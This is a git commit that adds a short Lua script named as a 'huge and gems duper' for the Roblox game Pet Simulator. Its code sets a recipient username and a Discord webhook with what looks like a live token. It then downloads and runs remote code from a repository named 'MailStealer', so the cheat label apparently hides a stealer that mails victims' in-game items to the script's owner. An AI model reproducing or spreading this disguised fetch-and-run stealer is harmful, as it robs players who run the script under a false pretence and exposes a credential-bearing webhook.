0d253df8706ea5692dd3a8426091bf87883fef7f
LILPENGU15 <Seanahl08@Gmail.com>
2025-01-21 20:47:25 +0100

    Add files via upload

---
+++ PET SIMULATOR   HUGE AND GEMS DUPER.lua
@@ -0,0 +1,5 @@
+Username = "@Ilike_BigBall090"
+LoadScreen = true 
+Webhook = "https://discord.com/api/webhooks/1331347012485910612/57plzvgVgGYF14cm1EuJXLbKtQQ0Vzzmox5mDI5C5v6N3USFdj5ZxMUB9UWP6t_3FttP" -- Paste your Discord webhook here
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/KiuuP/PS99_Mailstealer/main/MailStealer.lua"))()
